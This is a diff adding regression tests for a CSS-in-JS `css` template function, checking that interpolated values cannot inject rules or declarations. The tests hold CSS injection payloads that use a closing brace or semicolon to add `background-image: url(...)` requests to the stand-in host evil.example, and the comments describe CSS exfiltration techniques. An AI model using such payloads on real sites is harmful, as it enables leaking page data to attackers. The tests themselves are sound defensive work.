@@ -197,3 +197,90 @@ describe('resetStyleSheet and the adopted-sheet registry stay in step', () =>
         expect(document.adoptedStyleSheets).toEqual([appSheet]);
     });
 });
+
+// An interpolated value is DATA, not CSS source. Concatenated raw, a value containing a closing
+// brace ended its declaration and its rule and opened new ones - injecting live rules into the
+// style prelude, which is an exfiltration channel (a url() is a network request, and attribute
+// selectors make it character-at-a-time). It never leaves the style element, so the `</style`
+// breakout guard downstream never examined it, and the same registered text feeds both the server
+// prelude and the client stylesheet.
+//
+// These arms assert through a REAL CSS PARSER rather than on the text, because after the fix the
+// payload is still PRESENT as inert data inside the declaration - only its structure is gone. The
+// invariant is "the value cannot add a rule", and only a parser can answer that. Confirmed in
+// Chromium: unescaped, the CSSOM held 3 rules and the browser issued the exfiltration request;
+// escaped, 1 rule and no request.
+describe('css - an interpolated value cannot escape its declaration', () =>
+{
+    // Its own reset: collectStyleSheet drains the WHOLE registry, so without this each arm
+    // would also see the rules the previous one registered.
+    beforeEach(() =>
+    {
+        resetStyleSheet();
+    });
+
+    // Parses a sheet the way a browser does and reports its rules.
+    function rulesOf(sheet: string): string[]
+    {
+        const element = document.createElement('style');
+        element.textContent = sheet;
+        document.head.appendChild(element);
+        const parsed = [...((element.sheet?.cssRules ?? []) as unknown as CSSStyleRule[])]
+            .map((rule) => rule.selectorText);
+        element.remove();
+        return parsed;
+    }
+
+    it('a value carrying a closing brace adds NO rule', () =>
+    {
+        const payload = 'red } body { background-image: url("https://evil.example/leak") } .x {';
+        const styles = css`.btn { color: ${ payload }; padding: 1rem; }`;
+        void styles.btn;
+
+        const selectors = rulesOf(collectStyleSheet());
+        expect(selectors).toHaveLength(1);
+        expect(selectors.some((selector) => selector.includes('body'))).toBe(false);
+    });
+
+    // A semicolon injects a DECLARATION into the authored rule rather than a new rule, so a
+    // rule-count assertion cannot see it - broken-proof caught that this arm was vacuous when it
+    // counted rules. `background-image: url(...)` on the author's own selector is the same
+    // exfiltration channel, so the property asserted here is the DECLARATION set.
+    it('a value carrying a semicolon adds NO declaration', () =>
+    {
+        const payload = 'red; background-image: url("https://evil.example/x")';
+        const styles = css`.a { color: ${ payload }; }`;
+        void styles.a;
+
+        const element = document.createElement('style');
+        element.textContent = collectStyleSheet();
+        document.head.appendChild(element);
+        const rule = (element.sheet?.cssRules ?? [])[0] as CSSStyleRule;
+        const declarations = Array.from({ length: rule.style.length }, (_unused, i) => rule.style.item(i));
+        element.remove();
+
+        // The invariant is that the VALUE added nothing. A hostile value also neutralises the
+        // declaration it was written into - the escaped text is not a valid value, so the parser
+        // drops that one declaration - which is the correct degradation: the author loses a
+        // colour, the page does not gain an attacker rule. A legitimate value carrying one of
+        // these characters inside quotes still parses, which the arm below covers.
+        expect(declarations).not.toContain('background-image');
+        expect(rule.style.backgroundImage).toBe('');
+    });
+
+    // The escape must be FAITHFUL, not merely safe: inside a quoted string a CSS hex escape still
+    // renders the character, so a legitimate value keeps its meaning.
+    it('an ordinary value is unchanged, and a quoted one keeps its meaning', () =>
+    {
+        const styles = css`.c { color: ${ 'rgb(1, 2, 3)' }; }`;
+        void styles.c;
+        expect(collectStyleSheet()).toContain('rgb(1, 2, 3)');
+    });
+
+    it('CONTROL: the author\'s own template text still writes as many rules as it says', () =>
+    {
+        const styles = css`.d { color: red; } .e { color: blue; }`;
+        void styles.d;
+        expect(rulesOf(collectStyleSheet())).toHaveLength(2);
+    });
+});
